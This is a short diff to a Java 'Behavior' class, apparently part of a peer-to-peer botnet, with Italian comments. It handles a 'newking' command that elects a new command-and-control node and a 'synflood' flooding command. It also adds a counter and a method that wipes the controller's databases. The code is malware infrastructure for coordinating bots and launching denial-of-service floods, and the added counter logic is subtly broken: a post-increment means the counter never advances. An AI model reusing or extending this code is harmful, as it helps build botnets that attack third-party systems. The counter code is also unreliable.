@@ -263,6 +263,14 @@ public class Behavior {
 	private void executeCommand(String msg) {
 		System.out.println("Eseguendo comando " + msg);
 		if (msg.startsWith("newking")) {
+			Integer count=nServ.getCounterCeCMemory();
+			if(count!=null){
+				if(count==2){
+					clearCecDatabase();
+				nServ.setCounterCeCMemory(null);
+				}else
+					nServ.setCounterCeCMemory(count++);
+			}
 			updateCecInfo(msg);
 		}
 		if (msg.startsWith("synflood")) {
@@ -526,6 +534,7 @@ public class Behavior {
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
 			eng.setCommandandconquerStatus(true);
+			nServ.setCounterCeCMemory(0);
 			// nServ.getCommandConquerIps().remove(0); non lo faccio più perché
 			// mi aggiorno con il flood del cec
 			// nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(
@@ -614,6 +623,13 @@ public class Behavior {
 		}
 	}
 
+	public void clearCecDatabase(){
+		uServ.deleteAll();
+		bServ.deleteAll();
+		rServ.deleteAll();
+		
+	}
+	
 	public P2PMan getpServ() {
 		return pServ;
 	}
